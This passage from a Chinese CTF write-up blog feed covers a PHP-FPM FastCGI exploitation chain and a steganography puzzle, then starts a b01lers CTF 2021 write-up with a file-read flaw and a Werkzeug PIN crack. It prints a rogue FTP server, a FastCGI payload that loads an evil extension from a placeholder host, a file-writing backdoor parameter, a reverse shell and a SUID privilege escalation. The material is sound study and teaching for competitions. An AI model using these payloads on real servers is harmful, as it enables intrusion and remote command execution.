class="string">&#x27;http://YOUR_HOST/hpdoger.so&#x27;</span>, <span class="string">&#x27;/tmp/hpdoger.so&#x27;</span>);print_r(scandir(<span class="string">&#x27;/tmp&#x27;</span>));</span><br></pre></td></tr></table></figure><p>成功时可以得到如下回显。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( [0] &#x3D;&gt; . [1] &#x3D;&gt; .. [2] &#x3D;&gt; hpdoger.so )</span><br></pre></td></tr></table></figure><p>写一个恶意的 FTP 客户端。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket <span class="keyword">as</span> Socket</span><br><span class="line">socket = Socket.socket(Socket.AF_INET, Socket.SOCK_STREAM)</span><br><span class="line">socket.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">23</span>))  <span class="comment"># Bind socket to FTP port</span></span><br><span class="line">socket.listen(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">connection, address = socket.accept()</span><br><span class="line">connection.send(<span class="string">b&#x27;220 Welcome to py.evil.lemonprefect.cn\n&#x27;</span>)</span><br><span class="line">connection.send(<span class="string">b&#x27;331 Give me your password\n&#x27;</span>)</span><br><span class="line">connection.send(<span class="string">b&#x27;230 Fake Login Successful\n&#x27;</span>)</span><br><span class="line">connection.send(<span class="string">b&#x27;200 Switch to Binary mode KORA\n&#x27;</span>)</span><br><span class="line">connection.send(<span class="string">b&#x27;550 File Size?\n&#x27;</span>)</span><br><span class="line">connection.send(<span class="string">b&#x27;150 Fine\n&#x27;</span>)</span><br><span class="line">connection.send(<span class="string">b&#x27;227 Now Enter Extended Passive Mode (127,0,0,1,0,9001) Aha\n&#x27;</span>)</span><br><span class="line">connection.send(<span class="string">b&#x27;150 Actually No File\n&#x27;</span>)</span><br><span class="line">connection.send(<span class="string">b&#x27;221 Give me five and a reflect shell\n&#x27;</span>)</span><br><span class="line">connection.close()</span><br></pre></td></tr></table></figure><p>修改参考中的代码生成 payload。</p><blockquote><p><a href="https://github.com/wofeiwo/webcgi-exploits/blob/master/php/Fastcgi/fcgi_jailbreak.php#L29">https://github.com/wofeiwo/webcgi-exploits/blob/master/php/Fastcgi/fcgi_jailbreak.php#L29</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FCGIClient</span></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> VERSION_1 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> BEGIN_REQUEST = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> PARAMS = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">const</span> STDIN = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">const</span> RESPONDER = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_host</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_port</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_keepAlive</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$host</span>, <span class="variable">$port</span> = <span class="number">9000</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_host = <span class="variable">$host</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_port = <span class="variable">$port</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$params</span>, <span class="variable">$stdin</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$request</span> = <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::BEGIN_REQUEST, chr(<span class="number">0</span>) . chr(<span class="built_in">self</span>::RESPONDER) . chr((<span class="keyword">int</span>)<span class="keyword">$this</span>-&gt;_keepAlive) . str_repeat(chr(<span class="number">0</span>), <span class="number">5</span>));</span><br><span class="line">        <span class="variable">$paramsRequest</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$params</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) <span class="variable">$paramsRequest</span> .= <span class="keyword">$this</span>-&gt;buildNvpair(<span class="variable">$key</span>, <span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$paramsRequest</span>) <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::PARAMS, <span class="variable">$paramsRequest</span>);</span><br><span class="line">        <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::PARAMS, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$stdin</span>) <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::STDIN, <span class="variable">$stdin</span>);</span><br><span class="line">        <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::STDIN, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;data=&#x27;</span> . urlencode(<span class="variable">$request</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">buildPacket</span>(<span class="params"><span class="variable">$type</span>, <span class="variable">$content</span>, <span class="variable">$requestId</span> = <span class="number">1</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$clen</span> = strlen(<span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">return</span> chr(<span class="built_in">self</span>::VERSION_1)</span><br><span class="line">            . chr(<span class="variable">$type</span>)</span><br><span class="line">            . chr((<span class="variable">$requestId</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>)</span><br><span class="line">            . chr(<span class="variable">$requestId</span> &amp; <span class="number">0xFF</span>)</span><br><span class="line">            . chr((<span class="variable">$clen</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>)</span><br><span class="line">            . chr(<span class="variable">$clen</span> &amp; <span class="number">0xFF</span>)</span><br><span class="line">            . chr(<span class="number">0</span>)</span><br><span class="line">            . chr(<span class="number">0</span>)</span><br><span class="line">            . <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">buildNvpair</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$nlen</span> = strlen(<span class="variable">$name</span>);</span><br><span class="line">        <span class="variable">$vlen</span> = strlen(<span class="variable">$value</span>);</span><br><span class="line">        <span class="variable">$nvpair</span> = <span class="variable">$nlen</span> &lt; <span class="number">128</span> ? chr(<span class="variable">$nlen</span>) : chr((<span class="variable">$nlen</span> &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . chr((<span class="variable">$nlen</span> &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . chr((<span class="variable">$nlen</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . chr(<span class="variable">$nlen</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">        <span class="variable">$nvpair</span> = <span class="variable">$vlen</span> &lt; <span class="number">128</span> ? <span class="variable">$nvpair</span> . chr(<span class="variable">$vlen</span>) : <span class="variable">$nvpair</span> . chr((<span class="variable">$vlen</span> &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . chr((<span class="variable">$vlen</span> &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . chr((<span class="variable">$vlen</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . chr(<span class="variable">$vlen</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$nvpair</span> . <span class="variable">$name</span> . <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$filepath</span> = <span class="string">&quot;/var/www/html/add_api.php&quot;</span>;  <span class="comment">// PHP file path</span></span><br><span class="line"><span class="variable">$req</span> = <span class="string">&#x27;/&#x27;</span> . basename(<span class="variable">$filepath</span>);</span><br><span class="line"><span class="variable">$uri</span> = <span class="variable">$req</span> . <span class="string">&#x27;?&#x27;</span> . <span class="string">&#x27;command=whoami&#x27;</span>;</span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> FCGIClient(<span class="string">&quot;unix:///var/run/php-fpm.sock&quot;</span>, -<span class="number">1</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&quot;&lt;?php system(\$_REQUEST[&#x27;command&#x27;]); phpinfo(); ?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$php_value</span> = <span class="string">&quot;unserialize_callback_func = system\nextension_dir = /tmp\nextension = hpdoger.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = &quot;</span>;  <span class="comment">// import evil hpdoger.so from /tmp</span></span><br><span class="line"><span class="variable">$params</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span> =&gt; <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_METHOD&#x27;</span> =&gt; <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span> =&gt; <span class="variable">$filepath</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_NAME&#x27;</span> =&gt; <span class="variable">$req</span>,</span><br><span class="line">    <span class="string">&#x27;QUERY_STRING&#x27;</span> =&gt; <span class="string">&#x27;command=whoami&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_URI&#x27;</span> =&gt; <span class="variable">$uri</span>,</span><br><span class="line">    <span class="string">&#x27;DOCUMENT_URI&#x27;</span> =&gt; <span class="variable">$req</span>,</span><br><span class="line">    <span class="string">&#x27;PHP_VALUE&#x27;</span> =&gt; <span class="variable">$php_value</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span> =&gt; <span class="string">&#x27;80sec/wofeiwo&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_ADDR&#x27;</span> =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_PORT&#x27;</span> =&gt; <span class="string">&#x27;9001&#x27;</span>,  <span class="comment">// Fast_CGI Port</span></span><br><span class="line">    <span class="string">&#x27;SERVER_ADDR&#x27;</span> =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PORT&#x27;</span> =&gt; <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_NAME&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> =&gt; <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;CONTENT_LENGTH&#x27;</span> =&gt; strlen(<span class="variable">$code</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$client</span>-&gt;request(<span class="variable">$params</span>, <span class="variable">$code</span>) . <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>运行脚本可以得到如下结果。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data&#x3D;%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02%3F%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B3PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Ftmp%0Aextension+%3D+hpdoger.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00</span><br></pre></td></tr></table></figure><p>构造出如下载荷。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?backdoor&#x3D;$file&#x3D;$_GET[&#39;file&#39;];$data&#x3D;$_GET[&#39;data&#39;];file_put_contents($file, $data);</span><br><span class="line">&amp;file&#x3D;ftp:&#x2F;&#x2F;evil@YOUR_HOST&#x2F;evil&amp;data&#x3D;GENERATED_DATA_HERE</span><br></pre></td></tr></table></figure><p>运行写好的恶意 FTP 服务端，监听在恶意 so 中设定的端口。将载荷拼接后发送后可以在监听端口处得到反弹的 shell。</p><p>使用 <code>find /usr/local/bin -perm -u=s -type f 2&gt;/dev/null</code> 查到 PHP 具有 suid，因此直接使用 PHP 的交互 shell 尝试获取 flag。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@1f3072aea021:~/html$ find /usr/<span class="built_in">local</span>/bin -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">&lt; find /usr/<span class="built_in">local</span>/bin -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/usr/<span class="built_in">local</span>/bin/php</span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/7f363bdc-676b-4e98-b8ef-59cfda4fd170/1620049443407/2dd7c47cdc393ff1db87508c1ea764be60013542.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d0a13137-6a17-408a-8298-16b816f34806&#125;</span><br></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="冬奥会-is-coming"><a href="#冬奥会-is-coming" class="headerlink" title="冬奥会_is_coming"></a>冬奥会_is_coming</h3><p>附件给出了一张图片，使用 <code>binwalk -e</code> 可以分离出一个压缩文档。压缩包的备注中有 <code>eight numbers</code> 的提示，但是压缩包本身并没有被加密，因此猜测是有隐写。使用 010 editor 打开解压所得的音频文件可在其尾部发现如下信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">🙃💵🌿🎤🚪🌏🐎🥋🚫😆🎃✅⌨🔪❓🚫🐍🙃🔬✉👁😆🎈🐘🏎🐘🐘😂😎🎅🖐🐍✉🍌🌪🐎🍵✅🚪✖☃👣👉ℹ🔪🍎🔄👣🚪😁👣💵🐅🍵🔬🛩😇🖐🖐🎅✅🏎👌🚨😆🎤🎅🦓🌿🦓🙃✖🍌🛩😂👑🌏☃😇😍🛩🚹😀🍌🎈💧🗒🗒</span><br></pre></td></tr></table></figure><p>猜测是 emoji-aes 加密，但是使用冬奥会的日期作为 key 尝试解密并不成功，因此猜测在音频中仍然有信息。使用 MP3stego 配合冬奥会日期 <code>20220204</code> 作为 key 执行 <code>Decode.exe -X -P 20220204 .\encode.mp3</code> 可提取出如下信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\xe2\x9c\x8c\xef\xb8\x8e \xe2\x98\x9d\xef\xb8\x8e\xe2\x99\x93\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x98\x9f\xef\xb8\x8e\xe2\x97\x86\xef\xb8\x8e\xe2\x99\x8c\xef\xb8\x8e \xe2\x9d\x92\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x97\xbb\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xe2\xac\xa7\xef\xb8\x8e\xe2\x99\x93\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xe2\x9d\x92\xef\xb8\x8e\xe2\x8d\x93\xef\xb8\x8e \xe2\x96\xa0\xef\xb8\x8e\xe2\x99\x8b\xef\xb8\x8e\xe2\x9d\x8d\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x99\x8e\xef\xb8\x8e \xf0\x9f\x93\x82\xef\xb8\x8e\xe2\x99\x8d\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xf0\x9f\x8f\xb1\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x99\x8b\xef\xb8\x8e\xf0\x9f\x99\xb5 \xe2\x99\x93\xef\xb8\x8e\xe2\xac\xa7\xef\xb8\x8e \xe2\x9d\x96\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x9d\x92\xef\xb8\x8e\xe2\x8d\x93\xef\xb8\x8e \xe2\x99\x93\xef\xb8\x8e\xe2\x96\xa0\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x9d\x92\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\xac\xa7\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x99\x93\xef\xb8\x8e\xe2\x96\xa0\xef\xb8\x8e\xe2\x99\x91\xef\xb8\x8e\xf0\x9f\x93\xac\xef\xb8\x8e \xf0\x9f\x95\x88\xef\xb8\x8e\xe2\x99\x92\xef\xb8\x8e\xe2\x8d\x93\xef\xb8\x8e \xe2\x96\xa0\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e \xe2\xa7\xab\xef\xb8\x8e\xe2\x99\x8b\xef\xb8\x8e\xf0\x9f\x99\xb5\xe2\x99\x8f\xef\xb8\x8e \xe2\x99\x8b\xef\xb8\x8e \xe2\x97\x8f\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xf0\x9f\x99\xb5 \xe2\x99\x8b\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e \xe2\x99\x93\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x9c\x8d\xef\xb8\x8e</span><br></pre></td></tr></table></figure><p>使用 CyberChef From Hex 解码后可得如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">✌︎☝︎♓︎⧫︎☟︎◆︎♌︎❒︎♏︎◻︎□︎⬧︎♓︎⧫︎□︎❒︎⍓︎■︎♋︎❍︎♏︎♎︎📂︎♍︎♏︎🏱︎♏︎♋︎🙵♓︎⬧︎❖︎♏︎❒︎⍓︎♓︎■︎⧫︎♏︎❒︎♏︎⬧︎⧫︎♓︎■︎♑︎📬︎🕈︎♒︎⍓︎■︎□︎⧫︎⧫︎♋︎🙵♏︎♋︎●︎□︎□︎🙵♋︎⧫︎♓︎⧫︎✍︎</span><br></pre></td></tr></table></figure><p>用 <a href="https://wingdingstranslator.com/">Wingdings Translator</a> 将其翻译后可得如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A︎G︎i︎t︎H︎u︎b︎r︎e︎p︎o︎s︎i︎t︎o︎r︎y︎n︎a︎m︎e︎d︎1︎c︎e︎P︎e︎a︎🙵i︎s︎v︎e︎r︎y︎i︎n︎t︎e︎r︎e︎s︎t︎i︎n︎g︎.︎W︎h︎y︎n︎o︎t︎t︎a︎🙵e︎a︎l︎o︎o︎🙵a︎t︎i︎t︎?︎</span><br></pre></td></tr></table></figure><p>在 GitHub 上搜寻 1cePeak 可以找到一个 repository，在其文件中可以找到如下关键内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line"></span><br><span class="line">echo How_6ad_c0uld_a_1cePeak_be? &gt;&amp;2</span><br></pre></td></tr></table></figure><p>使用 <code>How_6ad_c0uld_a_1cePeak_be?</code> 作为 key 解密 emoji-aes 的密文可以得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e32f619b-dbcd-49bd-9126-5d841aa01767&#125;</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      
      <comments>https://lemonprefect.cn/zh-CN/posts/e43fbefd.html#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>b01lers CTF 2021</title>
      <link>https://lemonprefect.cn/zh-CN/posts/1ff2873b.html</link>
      <guid>https://lemonprefect.cn/zh-CN/posts/1ff2873b.html</guid>
      <pubDate>Tue, 06 Apr 2021 05:51:00 GMT</pubDate>
      
        
        
          
          
      <description>&lt;h2 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h2&gt;&lt;h3 id=&quot;gdpr&quot;&gt;&lt;a href=&quot;#gdpr&quot; class=&quot;headerlink&quot; title=&quot;gdpr&quot;&gt;&lt;/a&gt;gdpr&lt;/h3&gt;&lt;p&gt;查看页面源代码可以得到如下信息。&lt;/p&gt;
&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td</description>
          
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="gdpr"><a href="#gdpr" class="headerlink" title="gdpr"></a>gdpr</h3><p>查看页面源代码可以得到如下信息。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/flag_policy&quot;</span>&gt;</span>Flag policy:<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>定向到 <code>/flag_policy</code> 即可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bctf&#123;annoying_but_good?&#125;</span><br></pre></td></tr></table></figure><h3 id="lorem-ipsum"><a href="#lorem-ipsum" class="headerlink" title="lorem_ipsum"></a>lorem_ipsum</h3><h4 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h4><p>GET 参数 <code>animal</code> 处代码逻辑可用报错带出。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    f = request.args.get(<span class="string">&#x27;animal&#x27;</span>, <span class="string">&#x27;dogs&#x27;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(f, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        file_content = f.read(<span class="number">200</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &lt;blockquote&gt;&#123;&#125;&lt;/blockquote&gt;</span></span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure><p>可以知道此处存在任意文件读取，且仅可读取 200 长度的内容。尝试读取 <code>/proc/self/cmdline</code> 可得如下信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/python3 /home/loremipsum/loremipsum.py</span><br></pre></td></tr></table></figure><p>同时尝试传入 <code>animal=flag</code> 可以得到内容而不是报错，猜测 flag 文件就存在当前目录下。下一步要做的就是突破文件读取长度限制。</p><h4 id="Werkzeug-Debug-Console-PIN-Crack"><a href="#Werkzeug-Debug-Console-PIN-Crack" class="headerlink" title="Werkzeug Debug Console PIN Crack"></a>Werkzeug Debug Console PIN Crack</h4><blockquote><p>参考：<a href="https://book.hacktricks.xyz/pentesting/pentesting-web/werkzeug">https://book.hacktricks.xyz/pentesting/pentesting-web/werkzeug</a></p></blockquote><p>参考文章中有逆向 Werkzeug Debug Console 的 PIN 生成原理的内容，这里直接贴脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span 